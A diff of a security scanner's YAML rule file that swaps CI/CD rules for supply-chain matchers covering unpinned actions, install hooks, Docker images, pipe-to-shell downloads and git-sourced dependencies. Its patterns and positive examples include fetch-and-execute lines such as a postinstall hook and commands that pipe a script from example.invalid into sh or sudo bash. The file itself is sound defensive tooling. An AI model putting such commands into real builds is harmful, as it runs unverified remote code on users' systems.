@@ -1,100 +1,77 @@
-- id: github-actions-pr-target
-  category: ci-cd
-  severity_hint: high
-  confidence_hint: high
-  globs:
-    - "**/.github/workflows/*.yml"
-    - "**/.github/workflows/*.yaml"
-  patterns:
-    - "pull_request_target"
-  nearby_terms:
-    - "checkout"
-    - "run:"
-    - "npm"
-    - "pnpm"
-    - "yarn"
-  reason: "Privileged pull_request_target workflow may execute untrusted fork code."
-  review_prompt: "Confirm whether attacker-controlled code runs with trusted token or secrets."
+# VibeSecurity dependency and build-integrity matchers.
+# Restricted YAML subset; see high-signal.yaml for field semantics.
+# Lockfile-driven advisory matching, registry existence, and manifest drift live
+# in the helper (sca, registry); these rules cover build inputs the parsers do not.
+
 - id: unpinned-github-action
   category: supply-chain
   severity_hint: medium
   confidence_hint: medium
+  cwe: "CWE-829"
+  owasp: "A03:2025"
+  asvs: "V15.2.4, V15.2.1"
   globs:
     - "**/.github/workflows/*.yml"
     - "**/.github/workflows/*.yaml"
   patterns:
     - "uses:"
-  nearby_terms:
+  same_line_terms:
     - "@v"
     - "@main"
     - "@master"
-  reason: "Third-party action may be version-tag pinned instead of commit pinned."
-  review_prompt: "Check whether the action is trusted and whether commit pinning is appropriate."
+    - "@latest"
+  exclude_patterns:
+    - "uses: ./"
+    - "uses: ."
+  reason: "A third-party action is referenced by a mutable tag or branch instead of an immutable commit SHA, so a compromised upstream tag runs inside this workflow."
+  review_prompt: "Pin third-party actions to a full commit SHA with a version comment; keep Dependabot or Renovate updating the pin."
+  positive_examples:
+    - "uses: actions/checkout@v4"
+    - "- uses: some-org/some-action@main"
+  negative_examples:
+    - "uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0"
+    - "uses: ./.github/actions/local"
 - id: package-install-script
   category: supply-chain
   severity_hint: medium
   confidence_hint: medium
+  cwe: "CWE-829"
+  owasp: "A03:2025"
+  asvs: "V15.2.4, V15.2.5"
   globs:
     - "**/package.json"
     - "**/pyproject.toml"
+    - "**/setup.py"
     - "**/Cargo.toml"
+    - "**/build.rs"
   patterns:
-    - "postinstall"
-    - "preinstall"
-    - "curl |"
+    - "\"postinstall\""
+    - "\"preinstall\""
+    - "\"install\":"
+    - "\"prepare\":"
+    - "curl "
+    - "wget "
     - "bash -c"
-  nearby_terms:
-    - "scripts"
-    - "build"
-    - "install"
-  reason: "Install or build script may execute unexpected code."
-  review_prompt: "Inspect script source, trust boundary, and whether network downloads or shell pipes are necessary."
-- id: gitlab-ci-secret-boundary
-  category: ci-cd
-  severity_hint: high
-  confidence_hint: medium
-  globs:
-    - "**/.gitlab-ci.yml"
-    - "**/.gitlab-ci.yaml"
-  patterns:
-    - "script:"
-    - "curl"
-    - "docker:dind"
-    - "privileged: true"
-  nearby_terms:
-    - "deploy"
-    - "secret"
-    - "token"
-    - "protected"
-    - "environment"
-  reason: "GitLab CI job may mix untrusted code execution with privileged deployment or secrets."
-  review_prompt: "Check protected refs, secret exposure, includes, artifacts, and deployment environment approvals."
-- id: jenkins-shell-or-secret-boundary
-  category: ci-cd
-  severity_hint: high
-  confidence_hint: medium
-  globs:
-    - "**/Jenkinsfile"
-  patterns:
-    - "sh "
-    - "bat "
-    - "withCredentials"
-    - "checkout"
-  nearby_terms:
-    - "deploy"
-    - "secret"
-    - "token"
-    - "pull"
-    - "branch"
-  reason: "Jenkins pipeline may execute branch-controlled code near credentials or deployment."
-  review_prompt: "Check branch trust, credential scope, shell interpolation, and deployment gates."
+    - "| sh"
+    - "| bash"
+    - "cmdclass"
+  reason: "An install or build hook executes code on every install; this is the channel used by npm and PyPI supply-chain malware."
+  review_prompt: "Inspect the hook source, confirm it is necessary, remove network downloads and shell pipes, and prefer ignore-scripts in CI."
+  positive_examples:
+    - "\"postinstall\": \"node scripts/setup.js && curl -sSL https://example.invalid/install.sh | sh\""
+  negative_examples:
+    - "\"test\": \"vitest run\""
 - id: docker-unpinned-or-remote-script
   category: supply-chain
   severity_hint: medium
   confidence_hint: medium
+  cwe: "CWE-494, CWE-829"
+  owasp: "A03:2025"
+  asvs: "V15.2.4"
   globs:
     - "**/Dockerfile"
     - "**/*.dockerfile"
+    - "**/Dockerfile.*"
   patterns:
     - "FROM "
     - "curl "
@@ -105,85 +82,72 @@
     - "| sh"
     - "| bash"
     - "chmod +x"
-  reason: "Container build may use mutable base images or execute remote scripts."
-  review_prompt: "Check base-image pinning, provenance, remote downloads, and whether secrets can enter image layers."
-- id: terraform-public-or-wildcard-access
+    - "ADD http"
+  exclude_patterns:
+    - "@sha256:"
+  reason: "A container build uses a mutable base image tag or executes a remotely downloaded script without an integrity check."
+  review_prompt: "Pin base images by digest, download artifacts with checksum or signature verification, and keep secrets out of build layers."
+  positive_examples:
+    - "FROM node:latest"
+    - "RUN curl -fsSL https://example.invalid/get.sh | bash"
+  negative_examples:
+    - "FROM node:22-bookworm@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+- id: remote-script-pipe-to-shell
   category: supply-chain
-  severity_hint: high
-  confidence_hint: medium
+  severity_hint: medium
+  confidence_hint: high
+  cwe: "CWE-494"
+  owasp: "A03:2025"
+  asvs: "V15.2.4"
   globs:
-    - "**/*.tf"
-    - "**/*.tfvars"
-  patterns:
-    - "0.0.0.0/0"
-    - "::/0"
-    - "Principal"
-    - "Action"
-  nearby_terms:
-    - "*"
-    - "ingress"
-    - "cidr"
-    - "iam"
-    - "policy"
-    - "public"
-  reason: "Infrastructure-as-code may expose public network or wildcard IAM access."
-  review_prompt: "Check whether the public or wildcard access is required, scoped, and protected by environment controls."
-- id: kubernetes-privileged-workload
-  category: supply-chain
-  severity_hint: high
-  confidence_hint: medium
-  globs:
+    - "**/*.sh"
+    - "**/Makefile"
     - "**/*.yml"
     - "**/*.yaml"
-  patterns:
-    - "privileged:"
-    - "hostPath:"
-    - "hostNetwork:"
-    - "runAsUser: 0"
-  nearby_terms:
-    - "kind:"
-    - "container"
-    - "pod"
-    - "deployment"
-    - "securityContext"
-  reason: "Kubernetes workload may request privileged host access."
-  review_prompt: "Check pod security context, host mounts, namespace/RBAC scope, and whether privileged access is required."
-- id: github-actions-broad-permissions
-  category: ci-cd
-  severity_hint: high
+    - "**/*.ps1"
+    - "**/Jenkinsfile"
+  regex_patterns:
+    - "(?i)(?:curl|wget|Invoke-WebRequest|iwr)\b[^\n|]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|python3?|node|iex|Invoke-Expression)\b"
+  reason: "A script is downloaded and piped straight into an interpreter, so the download host or a network attacker controls what executes."
+  review_prompt: "Download to a file, verify a checksum or signature, then execute; pin the version in the URL."
+  positive_examples:
+    - "curl -fsSL https://example.invalid/install.sh | sudo bash"
+  negative_examples:
+    - "curl -fsSL -o install.sh https://example.invalid/install.sh && sha256sum -c install.sh.sha256"
+- id: dependency-from-git-or-url
+  category: supply-chain
+  severity_hint: medium
   confidence_hint: medium
+  cwe: "CWE-829"
+  owasp: "A03:2025"
+  asvs: "V15.2.4"
   globs:
-    - "**/.github/workflows/*.yml"
-    - "**/.github/workflows/*.yaml"
+    - "**/package.json"
+    - "**/requirements*.txt"
+    - "**/pyproject.toml"
+    - "**/Cargo.toml"
+    - "**/Gemfile"
+    - "**/go.mod"
   patterns:
-    - "write-all"
-    - "contents: write"
-    - "actions: write"
-    - "packages: write"
-    - "id-token: write"
-  nearby_terms:
-    - "permissions:"
-    - "pull_request"
-    - "issue"
-    - "deploy"
-  reason: "Workflow permissions may exceed the job's required trust boundary."
-  review_prompt: "Confirm each write or OIDC permission is required and cannot be reached from untrusted event data or code."
-- id: circleci-privileged-job-boundary
-  category: ci-cd
-  severity_hint: high
-  confidence_hint: medium
-  globs:
-    - "**/.circleci/config.yml"
-    - "**/.circleci/config.yaml"
-  patterns:
-    - "setup_remote_docker"
-    - "docker_layer_caching"
-    - "run:"
-  nearby_terms:
-    - "deploy"
-    - "secret"
-    - "token"
-    - "sudo"
-    - "curl"
-  reason: "CircleCI job may combine privileged execution, credentials, or deployment with branch-controlled code."
-  review_prompt: "Check fork policy, contexts, secret scope, shell interpolation, remote Docker privileges, and deployment approvals."
+    - "\"git+"
+    - "\"github:"
+    - "\"https://github.com/"
+    - "\"http://"
+    - "git+https://"
+    - "git+ssh://"
+    - "@ git+"
+    - "git = \""
+    - "branch = \""
+    - "replace "
+  exclude_patterns:
+    - "\"repository\""
+    - "\"homepage\""
+    - "\"bugs\""
+    - "\"url\":"
+  reason: "A dependency resolves from a git ref or URL instead of a registry release, bypassing registry integrity and making the build depend on a mutable upstream."
+  review_prompt: "Pin to a commit SHA or published version, or vendor the code; confirm who controls the referenced repository."
+  positive_examples:
+    - "\"left-pad\": \"github:someone/left-pad#main\","
+    - "requests @ git+https://github.com/example/requests.git@main"
+  negative_examples:
+    - "\"repository\": \"https://github.com/example/app\","
